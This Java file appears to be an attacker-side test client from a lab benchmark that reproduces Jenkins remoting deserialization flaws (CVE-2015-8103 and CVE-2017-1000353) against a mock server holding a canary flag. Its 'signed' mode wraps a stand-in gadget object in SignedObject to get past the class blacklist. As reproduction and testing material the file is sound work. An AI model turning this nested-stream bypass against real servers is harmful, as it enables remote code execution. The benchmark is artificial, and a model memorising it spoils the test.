import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.ObjectOutputStream;
import java.io.OutputStream;
import java.io.Serializable;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.PrivateKey;
import java.security.Signature;
import java.security.SignedObject;

import org.apache.commons.collections.functors.PcbSeed;

/**
 * EXTERNAL TCP client (attacker peer) for deser_jenkins_remoting. A SEPARATE process, in a SEPARATE
 * container, connecting to the REAL remoting TCP server over a real TCP socket -- the genuine external
 * network trigger for a NETWORK channel framework (hudson.remoting).
 *
 * It builds the exact serialized wire the server's hudson.remoting.ObjectInputStreamEx reads (a standard
 * Java serialization stream: header + one object), then opens a TCP connection and writes those bytes.
 * The client uses only java.io / java.security; it NEVER holds the ${PCB_FLAG} canary (PcbSeed.readObject
 * reads /canary/flag.txt only on the SERVER side; on the client there is no /canary, so serializing a
 * PcbSeed carries only its class name + descriptor + empty field data). The flag is read only server-side
 * during reconstruction and echoed back over this socket.
 *
 * modes:
 *   direct   = the CVE-2015-8103 SEED: a plain-serialized org.apache.commons.collections.functors.PcbSeed
 *              sent DIRECTLY. -> the outer ObjectInputStreamEx.resolveClass() checks the blacklisted class
 *              name -> BLOCKED on V1/V2, REACHES on V0.
 *   signed   = the CVE-2017-1000353 RESIDUAL: the SAME PcbSeed wrapped inside a java.security.SignedObject.
 *              The outer stream only ever names java.security.SignedObject (NOT blacklisted on V1);
 *              SignedObject.getObject() reconstructs PcbSeed via its OWN unfiltered ObjectInputStream ->
 *              REACHES on V1 (nested-stream bypass), BLOCKED on V2 (SignedObject now blacklisted).
 *   expected = the legit non-blacklisted PcbExpected as a control (passes on V0/V1/V2).
 *
 * args: [host] [port] [mode]
 */
public class Client {

    static byte[] serialize(Serializable obj) throws Exception {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        oos.writeObject(obj);
        oos.flush();
        oos.close();
        return bos.toByteArray();
    }

    /** Build the serialized payload bytes for the chosen mode. */
    static byte[] payload(String mode) throws Exception {
        switch (mode) {
            case "direct":
                // CVE-2015-8103 seed: the dangerous-family class, sent directly.
                return serialize(new PcbSeed());
            case "signed": {
                // CVE-2017-1000353 residual: the SAME PcbSeed wrapped inside a java.security.SignedObject.
                // The SignedObject constructor signs (and internally serializes) the inner PcbSeed;
                // getObject() later reconstructs it via its own unfiltered ObjectInputStream (server-side).
                KeyPair kp = KeyPairGenerator.getInstance("RSA").genKeyPair();
                PrivateKey priv = kp.getPrivate();
                Signature sig = Signature.getInstance("SHA256withRSA");
                SignedObject signed = new SignedObject(new PcbSeed(), priv, sig);
                return serialize(signed);
            }
            case "expected":
                // Benign control: non-blacklisted app object (deserializes on every version).
                return serialize(new PcbExpected());
            default:
                throw new IllegalArgumentException("mode: " + mode);
        }
    }

    public static void main(String[] args) throws Exception {
        String host = args.length > 0 ? args[0] : "127.0.0.1";
        int port = args.length > 1 ? Integer.parseInt(args[1]) : 9009;
        String mode = args.length > 2 ? args[2] : "direct";

        byte[] body = payload(mode);

        String txt = "";
        try (Socket s = new Socket(host, port)) {
            s.setSoTimeout(8000);
            OutputStream os = s.getOutputStream();
            os.write(body);        // raw Java serialization stream; the server's ObjectInputStreamEx reads it
            os.flush();
            s.shutdownOutput();    // signal end-of-request; the read half stays open for the server's reply

            InputStream is = s.getInputStream();
            ByteArrayOutputStream resp = new ByteArrayOutputStream();
            byte[] buf = new byte[4096];
            int n;
            try {
                while ((n = is.read(buf)) > 0) {
                    resp.write(buf, 0, n);
                }
            } catch (Exception readEnd) {
                /* soTimeout / server closed -> done reading */
            }
            txt = new String(resp.toByteArray(), StandardCharsets.UTF_8).replaceAll("[\\r\\n]", " ");
        }

        System.out.println("CLIENT_MODE=" + mode);
        System.out.println("CLIENT_RESP=" + txt);
    }
}
